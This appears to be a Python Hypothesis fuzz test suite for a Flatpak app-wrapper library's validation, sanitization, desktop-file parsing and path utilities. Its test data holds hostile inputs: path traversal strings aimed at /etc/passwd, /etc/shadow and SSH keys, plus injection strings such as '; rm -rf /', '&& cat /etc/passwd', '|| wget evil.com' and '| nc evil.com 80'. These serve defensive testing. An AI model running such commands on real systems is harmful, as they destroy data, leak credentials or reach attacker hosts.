#!/usr/bin/env python3
"""Comprehensive fuzz tests for core library modules using Hypothesis.

Tests functions for robustness against edge cases: empty strings, very long strings,
unicode, special characters, path traversal attempts, and other malformed inputs.
"""

from __future__ import annotations

import os
import re
import tempfile
import unicodedata
from pathlib import Path

import pytest
from hypothesis import given, settings, HealthCheck
from hypothesis.strategies import (
    text,
    one_of,
    none,
    integers,
    lists,
    composite,
    binary,
    sampled_from,
)

# Import modules under test
from lib.validation import (
    validate_app_id,
    check_path_traversal,
    should_process_event,
)
from lib.safety import (
    validate_flatpak_id,
    sanitize_string,
    is_wrapper_file,
    get_wrapper_id,
    is_test_environment,
)
from lib.python_utils import (
    sanitize_id_to_name,
    canonicalize_path_no_resolve,
    validate_home_dir,
    sanitize_string as pyutils_sanitize_string,
)
from lib.desktop_parser import (
    DesktopEntry,
    find_desktop_files,
    get_app_metadata,
)
from lib.paths import (
    get_default_config_dir,
    get_default_bin_dir,
    get_default_data_dir,
    get_default_cache_dir,
    get_lock_dir,
    get_scripts_dir,
    resolve_bin_dir,
    ensure_dir,
)


# =============================================================================
# Strategy Definitions
# =============================================================================

@composite
def flatpak_id_strategy(draw, min_size: int = 1, max_size: int = 200) -> str:
    """Generate valid Flatpak IDs plus potential edge cases."""
    choice = draw(integers(min_value=0, max_value=10))

    if choice < 3:
        # Valid reverse-DNS format IDs
        prefixes = ["org", "com", "io", "net", "edu", "gov", "uk", "de", "fr"]
        middles = ["mozilla", "google", "example", "github", "kde", "gnome", "valvesoftware"]
        suffixes = ["firefox", "chrome", "app", "app123", "gimp", "steam", "project"]
        prefix = draw(sampled_from(prefixes))
        middle = draw(sampled_from(middles))
        suffix = draw(sampled_from(suffixes))
        return f"{prefix}.{middle}.{suffix}"

    elif choice < 6:
        # Platform/runtime IDs with version
        prefixes = ["org", "com", "io"]
        runtimes = ["freedesktop", "gnome", "kde"]
        versions = ["21.08", "22.08", "23.08", "42.0", "45"]
        platforms = ["Platform", "Sdk", "Runtime"]
        prefix = draw(sampled_from(prefixes))
        runtime = draw(sampled_from(runtimes))
        version = draw(sampled_from(versions))
        platform = draw(sampled_from(platforms))
        return f"{prefix}.{runtime}.{platform}//{version}"

    else:
        # Random valid-ish IDs with special chars to test sanitization
        valid_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-"
        length = draw(integers(min_value=min_size, max_value=max_size))
        chars = [draw(sampled_from(list(valid_chars))) for _ in range(length)]
        return "".join(chars)


@composite
def path_traversal_attempt_strategy(draw) -> str:
    """Generate path traversal attempts."""
    choice = draw(integers(min_value=0, max_value=8))

    traversals = [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "....//",
        "....//....//",
        "/etc/passwd",
        "/proc/self/environ",
        "~/.ssh/id_rsa",
        "..\\..\\windows\\system32",
        "....\\\\....\\\\windows\\\\system32",
        "A" * 1000 + "../",
        "/var/lib/flatpak/../../etc/shadow",
        "./../.././../../",
        "\x00null byte",
        "/////../../",
        "....//....//....//....//",
    ]

    if choice < len(traversals):
        return traversals[choice]

    # Generate random traversal
    parts = [draw(sampled_from(["..", "....", ".", "A", "B"])) for _ in range(draw(integers(min_value=1, max_value=5)))]
    sep = draw(sampled_from(["/", "\\", "//", "\\\\"]))
    return sep.join(parts) + sep + "etc"


@composite
def special_string_strategy(draw, min_size: int = 0, max_size: int = 500) -> str:
    """Generate strings with special characters, unicode, and edge cases."""
    choice = draw(integers(min_value=0, max_value=15))

    special_strings = [
        "",
        "   ",
        "\t\n\r",
        "\x00\x01\x02",
        "\x7f\x80\xff",
        "🌲🌳🌴",
        "日本語テスト",
        "Ελληνικά",
        "العربية",
        "中文测试",
        "한국어",
        "עברית",
        "🎉🎊🎁",
        "\u200b\u200c\u200d",  # Zero-width characters
        "\ufeff",  # BOM
        "a" * 10000,
        "A" * 10000,
        "0" * 10000,
        "\x00" * 1000,
        "   \t\t   \n\n   \r\r   ",
        "NULL\x00BYTE",
        "SQL' OR '1'='1",
        "&#x27;alert&#x27;",
        "<script>alert('xss')</script>",
        "rm -rf /",
        "$(whoami)",
        "`id`",
        "${PATH}",
        "%%20encoded%%20spaces%%20",
        "\u0644\u0643\u0644",
        "München",  # German
        "Ångström",
        "Ærøskiøbing",
        "Zürich",
        "日本語",
    ]

    if choice < len(special_strings):
        return special_strings[choice]

    # Generate random unicode
    length = draw(integers(min_value=min_size, max_value=max_size))
    categories = ["Lu", "Ll", "Lt", "Lm", "Lo", "Nd", "Pc", "Pd", "Zs"]
    chars = []
    for _ in range(length):
        code = draw(integers(min_value=1, max_value=0x10FFFF))
        try:
            char = chr(code)
            if unicodedata.category(char) in categories:
                chars.append(char)
            else:
                chars.append("a")
        except (ValueError, OverflowError):
            chars.append("a")
    return "".join(chars)


@composite
def desktop_content_strategy(draw) -> tuple[str, str]:
    """Generate .desktop file content with various edge cases."""
    choice = draw(integers(min_value=0, max_value=12))

    if choice == 0:
        return ("minimal.desktop", """[Desktop Entry]
Name=Test App
Exec=/usr/bin/test
""")

    elif choice == 1:
        return ("full.desktop", """[Desktop Entry]
Type=Application
Name=Firefox Web Browser
Name[en_US]=Firefox
Name[de]=Feuerfuchs
Comment=Browse the World Wide Web
Comment[en_US]=Browse the World Wide Web
GenericName=Web Browser
Icon=firefox
Exec=firefox %u
Terminal=false
Categories=Network;WebBrowser;
StartupNotify=true
StartupWMClass=Firefox
""")

    elif choice == 2:
        return ("unicode.desktop", """[Desktop Entry]
Name=テストアプリケーション
Name[en_US]=Test Application
Comment=コメント
Exec=/usr/bin/test
""")

    elif choice == 3:
        return ("special_chars.desktop", """[Desktop Entry]
Name=<Test & "App">
Exec='/path/with spaces/test' --flag="value"
Comment=Test & "Special" <Characters>
""")

    elif choice == 4:
        return ("empty_sections.desktop", """[Desktop Entry]

[Another Section]

[Third]
Key=
Value=Content

[Empty]
# Just a comment

""")

    elif choice == 5:
        return ("flatpak.desktop", """[Desktop Entry]
Type=Application
Name=Test Flatpak App
X-Flatpak=com.example.TestApp
Exec=flatpak run com.example.TestApp
""")

    elif choice == 6:
        return ("no_newline.desktop", """[Desktop Entry]
Name=NoFinalNewline
Exec=test
NoDisplay=true""")

    elif choice == 7:
        return ("binary_junk.desktop", "[Desktop Entry]\nName=Test\x00\x01\x02\nExec=test\n")

    elif choice == 8:
        return ("very_long.desktop", "[Desktop Entry]\n" + "X-Custom=" + "A" * 10000 + "\n")

    elif choice == 9:
        return ("missing_equals.desktop", """[Desktop Entry]
Name
Exec=/test
""")

    elif choice == 10:
        return ("malformed_sections.desktop", """[[Desktop Entry]]
Name=Test
]Another[
Exec=test
[""")

    else:
        # Generate random content
        num_sections = draw(integers(min_value=1, max_value=5))
        sections = []
        valid_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
        for _ in range(num_sections):
            section_name = "".join([draw(sampled_from(list(valid_chars))) for _ in range(draw(integers(min_value=1, max_value=20)))])
            num_keys = draw(integers(min_value=1, max_value=10))
            keys = []
            for _ in range(num_keys):
                key = "".join([draw(sampled_from(list(valid_chars))) for _ in range(draw(integers(min_value=1, max_value=20)))])
                value_len = draw(integers(min_value=0, max_value=100))
                value = "".join([draw(sampled_from(list(valid_chars))) for _ in range(value_len)])
                keys.append(f"{key}={value}")
            sections.append(f"[{section_name}]\n" + "\n".join(keys))
        return ("generated.desktop", "\n\n".join(sections))


# =============================================================================
# Validation Module Tests
# =============================================================================

class TestValidationFuzz:
    """Fuzz tests for lib/validation.py"""

    @given(app_id=flatpak_id_strategy(min_size=0, max_size=500))
    @settings(max_examples=100, deadline=10000)
    def test_validate_app_id_no_crash(self, app_id: str) -> None:
        """Test that validate_app_id doesn't crash on any string input."""
        try:
            valid, error = validate_app_id(app_id)
            assert isinstance(valid, bool)
            assert isinstance(error, str)
        except Exception as e:
            pytest.fail(f"validate_app_id crashed on {app_id!r}: {e}")

    @given(app_id=special_string_strategy(min_size=0, max_size=1000))
    @settings(max_examples=100, deadline=10000)
    def test_validate_app_id_edge_cases(self, app_id: str) -> None:
        """Test validate_app_id with special character strings."""
        try:
            valid, error = validate_app_id(app_id)
            assert isinstance(valid, bool)
            assert isinstance(error, str)
            if not app_id or not app_id.strip():
                assert valid is False, "Empty/whitespace app_id should be invalid"
        except Exception as e:
            pytest.fail(f"validate_app_id crashed on special string: {e}")

    @given(base_dir=text(min_size=1, max_size=100), relative=text(min_size=1, max_size=200))
    @settings(max_examples=50, deadline=10000)
    def test_check_path_traversal_no_crash(self, base_dir: str, relative: str) -> None:
        """Test that check_path_traversal doesn't crash on various paths."""
        try:
            base = Path(tempfile.gettempdir()) / base_dir.replace("/", "_").replace("\\", "_")
            path = base / relative.replace("/", "_").replace("\\", "_")
            result = check_path_traversal(path, base)
            assert isinstance(result, tuple)
            assert len(result) == 2
            assert isinstance(result[0], bool)
            assert isinstance(result[1], str)
        except Exception as e:
            if "OSError" in type(e).__name__:
                pass
            else:
                pytest.fail(f"check_path_traversal crashed: {e}")

    @given(path_input=special_string_strategy(min_size=0, max_size=500))
    @settings(max_examples=50, deadline=10000)
    def test_should_process_event_no_crash(self, path_input: str) -> None:
        """Test that should_process_event doesn't crash on any path string."""
        try:
            result = should_process_event(path_input)
            assert isinstance(result, bool)
        except (ValueError, OSError):
            # ValueError from Path.resolve() for invalid paths is acceptable
            pass
        except Exception as e:
            pytest.fail(f"should_process_event crashed on {path_input!r}: {e}")

    @given(path_input=path_traversal_attempt_strategy())
    @settings(max_examples=50, deadline=5000)
    def test_path_traversal_detection(self, path_input: str) -> None:
        """Test that path traversal attempts are properly detected."""
        try:
            base = Path(tempfile.gettempdir()) / "test_base"
            path = base / path_input
            is_safe, error = check_path_traversal(path, base)
            assert isinstance(is_safe, bool)
            assert isinstance(error, str)
        except Exception:
            pass


# =============================================================================
# Safety Module Tests
# =============================================================================

class TestSafetyFuzz:
    """Fuzz tests for lib/safety.py"""

    @given(flatpak_id=flatpak_id_strategy(min_size=0, max_size=500))
    @settings(max_examples=100, deadline=10000)
    def test_validate_flatpak_id_no_crash(self, flatpak_id: str) -> None:
        """Test that validate_flatpak_id doesn't crash on any input."""
        try:
            result = validate_flatpak_id(flatpak_id)
            assert isinstance(result, bool)
        except Exception as e:
            pytest.fail(f"validate_flatpak_id crashed on {flatpak_id!r}: {e}")

    @given(flatpak_id=special_string_strategy(min_size=0, max_size=1000))
    @settings(max_examples=100, deadline=10000)
    def test_validate_flatpak_id_unicode(self, flatpak_id: str) -> None:
        """Test validate_flatpak_id with unicode and special characters."""
        try:
            result = validate_flatpak_id(flatpak_id)
            assert isinstance(result, bool)
            if not flatpak_id:
                assert result is False, "Empty flatpak_id should be invalid"
        except Exception as e:
            pytest.fail(f"validate_flatpak_id crashed on unicode string: {e}")

    @given(input_str=special_string_strategy(min_size=0, max_size=1000))
    @settings(max_examples=100, deadline=10000)
    def test_sanitize_string_no_crash(self, input_str: str) -> None:
        """Test that sanitize_string doesn't crash on any input."""
        try:
            result = sanitize_string(input_str)
            assert isinstance(result, str)
        except Exception as e:
            pytest.fail(f"sanitize_string crashed on {input_str!r}: {e}")

    @given(input_str=special_string_strategy(min_size=0, max_size=1000))
    @settings(max_examples=100, deadline=10000)
    def test_sanitize_string_output_valid(self, input_str: str) -> None:
        """Test that sanitize_string returns valid escaped output."""
        try:
            result = sanitize_string(input_str)
            assert isinstance(result, str)
        except Exception as e:
            pytest.fail(f"sanitize_string returned invalid output: {e}")


# =============================================================================
# Python Utils Module Tests
# =============================================================================

class TestPythonUtilsFuzz:
    """Fuzz tests for lib/python_utils.py"""

    @given(id_str=flatpak_id_strategy(min_size=0, max_size=500))
    @settings(max_examples=100, deadline=10000)
    def test_sanitize_id_to_name_no_crash(self, id_str: str) -> None:
        """Test that sanitize_id_to_name doesn't crash on any input."""
        try:
            result = sanitize_id_to_name(id_str)
            assert isinstance(result, str)
        except Exception as e:
            pytest.fail(f"sanitize_id_to_name crashed on {id_str!r}: {e}")

    @given(id_str=special_string_strategy(min_size=0, max_size=1000))
    @settings(max_examples=100, deadline=10000)
    def test_sanitize_id_to_name_edge_cases(self, id_str: str) -> None:
        """Test sanitize_id_to_name with special/unicode strings."""
        try:
            result = sanitize_id_to_name(id_str)
            assert isinstance(result, str)
            if id_str:
                assert len(result) > 0, "sanitize_id_to_name returned empty string"
        except Exception as e:
            pytest.fail(f"sanitize_id_to_name crashed: {e}")

    @given(id_str=flatpak_id_strategy(min_size=1, max_size=200))
    @settings(max_examples=50, deadline=10000)
    def test_sanitize_id_to_name_length(self, id_str: str) -> None:
        """Test that sanitize_id_to_name respects the 100 character limit."""
        try:
            result = sanitize_id_to_name(id_str)
            assert len(result) <= 100 or result.startswith("app-"), \
                f"sanitize_id_to_name exceeded length limit: {len(result)} chars"
        except Exception as e:
            pytest.fail(f"sanitize_id_to_name length check failed: {e}")

    @given(id_str=flatpak_id_strategy(min_size=1, max_size=100))
    @settings(max_examples=50, deadline=10000)
    def test_sanitize_id_to_name_returns_string(self, id_str: str) -> None:
        """Test that sanitize_id_to_name returns a non-empty string."""
        try:
            result = sanitize_id_to_name(id_str)
            assert isinstance(result, str)
            assert len(result) > 0, "sanitize_id_to_name returned empty string"
        except Exception as e:
            pytest.fail(f"sanitize_id_to_name check failed: {e}")

    @given(path_input=one_of(text(min_size=0, max_size=500), none()))
    @settings(max_examples=50, deadline=10000)
    def test_canonicalize_path_no_resolve_no_crash(self, path_input) -> None:
        """Test that canonicalize_path_no_resolve doesn't crash."""
        try:
            result = canonicalize_path_no_resolve(path_input)
            assert result is None or isinstance(result, Path)
        except Exception as e:
            pytest.fail(f"canonicalize_path_no_resolve crashed on {path_input!r}: {e}")

    @given(path_input=special_string_strategy(min_size=0, max_size=500))
    @settings(max_examples=50, deadline=10000)
    def test_canonicalize_path_special_chars(self, path_input: str) -> None:
        """Test canonicalize_path_no_resolve with special path characters."""
        try:
            result = canonicalize_path_no_resolve(path_input)
            assert result is None or isinstance(result, Path)
        except Exception as e:
            pytest.fail(f"canonicalize_path_no_resolve crashed on special path: {e}")

    @given(dir_path=one_of(text(min_size=0, max_size=500), none()))
    @settings(max_examples=50, deadline=10000)
    def test_validate_home_dir_no_crash(self, dir_path) -> None:
        """Test that validate_home_dir doesn't crash."""
        try:
            result = validate_home_dir(dir_path)
            assert result is None or isinstance(result, str)
        except Exception as e:
            pytest.fail(f"validate_home_dir crashed on {dir_path!r}: {e}")

    @given(dir_path=special_string_strategy(min_size=0, max_size=500))
    @settings(max_examples=50, deadline=10000)
    def test_validate_home_dir_traversal(self, dir_path: str) -> None:
        """Test that validate_home_dir handles path traversal safely."""
        try:
            result = validate_home_dir(dir_path)
            if result:
                assert result.startswith(str(Path.home()))
        except Exception as e:
            pytest.fail(f"validate_home_dir failed security check: {e}")


# =============================================================================
# Desktop Parser Module Tests
# =============================================================================

class TestDesktopParserFuzz:
    """Fuzz tests for lib/desktop_parser.py"""

    @given(content_data=desktop_content_strategy())
    @settings(max_examples=100, deadline=15000, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_desktop_entry_parse_no_crash(self, content_data: tuple, tmp_path: Path) -> None:
        """Test that DesktopEntry parsing doesn't crash on malformed files."""
        filename, content = content_data
        try:
            test_file = tmp_path / filename
            test_file.write_bytes(content.encode('utf-8', errors='replace'))

            entry = DesktopEntry(test_file)

            _ = entry.name
            _ = entry.comment
            _ = entry.icon
            _ = entry.categories
            _ = entry.exec_command
            _ = entry.terminal_required
            _ = entry.is_hidden
            _ = entry.no_display

        except Exception as e:
            pytest.fail(f"DesktopEntry crashed on {filename!r}: {e}")

    @given(content_data=desktop_content_strategy())
    @settings(max_examples=100, deadline=15000, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_desktop_entry_properties(self, content_data: tuple, tmp_path: Path) -> None:
        """Test DesktopEntry property access on various content."""
        filename, content = content_data
        test_file = tmp_path / filename
        try:
            test_file.write_bytes(content.encode('utf-8', errors='replace'))
            entry = DesktopEntry(test_file)

            name = entry.name
            assert name is None or isinstance(name, str)

            comment = entry.comment
            assert comment is None or isinstance(comment, str)

            icon = entry.icon
            assert icon is None or isinstance(icon, str)

            categories = entry.categories
            assert isinstance(categories, list)

            exec_cmd = entry.exec_command
            assert exec_cmd is None or isinstance(exec_cmd, str)

            terminal = entry.terminal_required
            assert isinstance(terminal, bool)

            hidden = entry.is_hidden
            assert isinstance(hidden, bool)

            no_display = entry.no_display
            assert isinstance(no_display, bool)

        except Exception as e:
            pytest.fail(f"DesktopEntry properties failed: {e}")

    @given(key=text(min_size=0, max_size=50), value=text(min_size=0, max_size=200))
    @settings(max_examples=100, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_desktop_entry_get_method(self, key: str, value: str, tmp_path: Path) -> None:
        """Test DesktopEntry.get() with various keys and values."""
        test_file = tmp_path / "test.desktop"
        test_file.write_text(f"[Desktop Entry]\nTestKey={value}\n")

        try:
            entry = DesktopEntry(test_file)
            result = entry.get(key)
            assert result is None or isinstance(result, str)
        except Exception as e:
            pytest.fail(f"DesktopEntry.get() crashed on key={key!r}: {e}")

    @given(flatpak_id=special_string_strategy(min_size=0, max_size=500))
    @settings(max_examples=50, deadline=10000)
    def test_get_app_metadata_no_crash(self, flatpak_id: str) -> None:
        """Test that get_app_metadata doesn't crash on any input."""
        try:
            result = get_app_metadata(flatpak_id)
            assert isinstance(result, dict)
            assert "name" in result
            assert "comment" in result
            assert "icon" in result
            assert "categories" in result
            assert "terminal" in result
            assert "exec" in result
        except Exception as e:
            pytest.fail(f"get_app_metadata crashed on {flatpak_id!r}: {e}")

    @given(directory=text(min_size=0, max_size=200))
    @settings(max_examples=100, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_find_desktop_files_no_crash(self, directory: str, tmp_path: Path) -> None:
        """Test that find_desktop_files doesn't crash on invalid directories."""
        try:
            test_dir = tmp_path / directory.replace("/", "_").replace("\\", "_")
            result = find_desktop_files(test_dir)
            assert isinstance(result, list)
        except Exception as e:
            pytest.fail(f"find_desktop_files crashed on {directory!r}: {e}")


# =============================================================================
# Paths Module Tests
# =============================================================================

class TestPathsFuzz:
    """Fuzz tests for lib/paths.py"""

    @given(app_name=text(min_size=0, max_size=200))
    @settings(max_examples=50, deadline=10000)
    def test_get_default_config_dir_no_crash(self, app_name: str) -> None:
        """Test that get_default_config_dir doesn't crash on any name."""
        try:
            result = get_default_config_dir(app_name if app_name else "default")
            assert isinstance(result, Path)
            assert len(str(result)) > 0
        except Exception as e:
            pytest.fail(f"get_default_config_dir crashed on {app_name!r}: {e}")

    @given(app_name=special_string_strategy(min_size=0, max_size=200))
    @settings(max_examples=100, deadline=10000)
    def test_get_default_config_dir_special_chars(self, app_name: str) -> None:
        """Test get_default_config_dir with special characters in app name."""
        try:
            result = get_default_config_dir(app_name if app_name else "default")
            assert isinstance(result, Path)
        except Exception as e:
            pytest.fail(f"get_default_config_dir failed with special chars: {e}")

    @given(app_name=text(min_size=0, max_size=200))
    @settings(max_examples=50, deadline=10000)
    def test_get_default_data_dir_no_crash(self, app_name: str) -> None:
        """Test that get_default_data_dir doesn't crash on any name."""
        try:
            result = get_default_data_dir(app_name if app_name else "default")
            assert isinstance(result, Path)
        except Exception as e:
            pytest.fail(f"get_default_data_dir crashed on {app_name!r}: {e}")

    @given(app_name=text(min_size=0, max_size=200))
    @settings(max_examples=50, deadline=10000)
    def test_get_default_cache_dir_no_crash(self, app_name: str) -> None:
        """Test that get_default_cache_dir doesn't crash on any name."""
        try:
            result = get_default_cache_dir(app_name if app_name else "default")
            assert isinstance(result, Path)
        except Exception as e:
            pytest.fail(f"get_default_cache_dir crashed on {app_name!r}: {e}")

    @given(explicit_dir=one_of(text(min_size=0, max_size=200), none()))
    @settings(max_examples=50, deadline=10000)
    def test_resolve_bin_dir_no_crash(self, explicit_dir) -> None:
        """Test that resolve_bin_dir doesn't crash on various inputs."""
        try:
            result = resolve_bin_dir(explicit_dir if explicit_dir else None)
            assert isinstance(result, Path)
        except Exception as e:
            pytest.fail(f"resolve_bin_dir crashed on {explicit_dir!r}: {e}")

    @given(path_input=one_of(text(min_size=0, max_size=500), none()))
    @settings(max_examples=100, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_ensure_dir_no_crash(self, path_input, tmp_path: Path) -> None:
        """Test that ensure_dir doesn't crash on various paths."""
        if path_input is None:
            return
        try:
            test_path = tmp_path / path_input.replace("/", "_").replace("\\", "_")
            result = ensure_dir(test_path)
            assert isinstance(result, Path)
        except (ValueError, OSError, PermissionError):
            # ValueError/OSError for invalid paths (null bytes, etc.) is acceptable
            pass
        except Exception as e:
            pytest.fail(f"ensure_dir crashed: {e}")


# =============================================================================
# Security Tests
# =============================================================================

class TestSecurityFuzz:
    """Security-focused fuzz tests."""

    @given(id_str=one_of(
        sampled_from([
            "../../etc/passwd",
            "../../../",
            "..\\..\\..\\windows\\system32",
            "\x00..\x00..",
            "....//....//etc/shadow",
        ]),
        path_traversal_attempt_strategy(),
    ))
    @settings(max_examples=50, deadline=5000)
    def test_sanitize_id_rejects_traversal(self, id_str: str) -> None:
        """Test that sanitize_id_to_name doesn't allow path traversal in output."""
        try:
            result = sanitize_id_to_name(id_str)
            assert ".." not in result, f"sanitize_id_to_name allows path traversal: {result!r}"
            assert not result.startswith("/"), "sanitize_id_to_name returns absolute path"
            assert not result.startswith("\\"), "sanitize_id_to_name returns Windows path"
        except Exception as e:
            pytest.fail(f"sanitize_id_to_name security check failed: {e}")

    @given(input_str=one_of(
        sampled_from([
            "$(whoami)",
            "`id`",
            "${HOME}/.ssh/id_rsa",
            "&& cat /etc/passwd",
            "; rm -rf /",
            "|| wget evil.com",
            "| nc evil.com 80",
            "<script>alert(1)</script>",
            "javascript:alert(1)",
        ]),
        special_string_strategy(min_size=10, max_size=200),
    ))
    @settings(max_examples=100, deadline=5000)
    def test_sanitize_string_injection_resistance(self, input_str: str) -> None:
        """Test that sanitize_string properly escapes injection attempts."""
        try:
            result = sanitize_string(input_str)
            assert isinstance(result, str)
        except Exception as e:
            pytest.fail(f"sanitize_string failed on injection attempt: {e}")

    @given(path_input=path_traversal_attempt_strategy())
    @settings(max_examples=50, deadline=5000)
    def test_validate_home_dir_blocks_traversal(self, path_input: str) -> None:
        """Test that validate_home_dir rejects path traversal outside HOME."""
        try:
            result = validate_home_dir(path_input)
            if result:
                home = str(Path.home())
                assert result.startswith(home), \
                    f"validate_home_dir allowed path outside HOME: {result}"
        except Exception:
            pass

    @given(app_id=one_of(
        sampled_from([
            ".hidden.app",
            "hidden.app.",
            "org..mozilla..firefox",
            "org.mozilla..firefox",
            "org...mozilla.firefox",
            "123start.app",
            "-start.app",
            "_start.app",
            "org.mozilla.firefox/",
            "org.mozilla/firefox",
        ]),
        text(min_size=0, max_size=100),
    ))
    @settings(max_examples=100, deadline=5000)
    def test_validate_app_id_security_checks(self, app_id: str) -> None:
        """Test that validate_app_id enforces security rules."""
        try:
            valid, error = validate_app_id(app_id)
            assert isinstance(valid, bool)
            assert isinstance(error, str)

            if app_id.startswith("."):
                assert valid is False, ".prefixed app_id should be invalid"
            if app_id.endswith("."):
                assert valid is False, ".suffixed app_id should be invalid"
            if app_id.endswith("/"):
                assert valid is False, "/suffixed app_id should be invalid"
        except Exception as e:
            pytest.fail(f"validate_app_id security check failed: {e}")

    @given(flatpak_id=one_of(
        sampled_from([
            ".hidden",
            "hidden.",
            "no.dot",
            "123start",
            "-start",
            "_start",
            "",
        ]),
        text(min_size=0, max_size=100),
    ))
    @settings(max_examples=100, deadline=5000)
    def test_validate_flatpak_id_security(self, flatpak_id: str) -> None:
        """Test that validate_flatpak_id enforces security rules."""
        try:
            result = validate_flatpak_id(flatpak_id)
            assert isinstance(result, bool)

            if not flatpak_id:
                assert result is False, "Empty flatpak_id should be invalid"
            if flatpak_id.startswith("."):
                assert result is False, ".prefixed flatpak_id should be invalid"
        except Exception as e:
            pytest.fail(f"validate_flatpak_id security check failed: {e}")


# =============================================================================
# Environment Tests
# =============================================================================

class TestEnvironmentFuzz:
    """Tests for environment-dependent functions."""

    @given(cmd=special_string_strategy(min_size=0, max_size=200))
    @settings(max_examples=100, deadline=10000)
    def test_find_executable_no_crash(self, cmd: str) -> None:
        """Test that find_executable doesn't crash on any input."""
        from lib.python_utils import find_executable

        try:
            result = find_executable(cmd)
            assert result is None or isinstance(result, str)
        except Exception as e:
            pytest.fail(f"find_executable crashed on {cmd!r}: {e}")


# =============================================================================
# Edge Case Tests
# =============================================================================

class TestEdgeCases:
    """Tests for extreme edge cases."""

    @given(value=text(min_size=0, max_size=10000))
    @settings(max_examples=100, deadline=10000)
    def test_very_long_strings(self, value: str) -> None:
        """Test functions with very long strings don't crash."""
        try:
            validate_app_id(value)
            validate_flatpak_id(value)
            sanitize_id_to_name(value)
            sanitize_string(value)
        except Exception as e:
            pytest.fail(f"Function crashed on very long string: {e}")

    @given(value=binary(min_size=0, max_size=10000))
    @settings(max_examples=50, deadline=10000)
    def test_binary_data(self, value: bytes) -> None:
        """Test that functions handle binary data gracefully."""
        try:
            str_value = value.decode('utf-8', errors='replace')
            sanitize_string(str_value)
            sanitize_id_to_name(str_value)
        except Exception as e:
            pytest.fail(f"Function crashed on binary data: {e}")

    @given(value=one_of(
        sampled_from(["\u0000", "\uffff", "\U0001f600", "\U0001f4bb", "\U000fefff"]),
        text(min_size=1, max_size=10),
    ))
    @settings(max_examples=50, deadline=5000)
    def test_unicode_edge_cases(self, value: str) -> None:
        """Test functions with unicode edge cases."""
        try:
            validate_flatpak_id(value)
            sanitize_id_to_name(value)
        except Exception as e:
            pytest.fail(f"Function crashed on unicode edge case: {value!r}: {e}")

    @given(samples=lists(
        one_of(
            text(min_size=0, max_size=100),
            sampled_from(["", "   ", "\t", "\n", "\r\n"]),
        ),
        min_size=0,
        max_size=100,
    ))
    @settings(max_examples=50, deadline=10000)
    def test_repeated_empty_strings(self, samples: list) -> None:
        """Test that functions handle repeated empty/whitespace strings."""
        for sample in samples:
            try:
                validate_app_id(sample)
                validate_flatpak_id(sample)
                sanitize_id_to_name(sample)
            except Exception as e:
                pytest.fail(f"Function crashed on repeated string {sample!r}: {e}")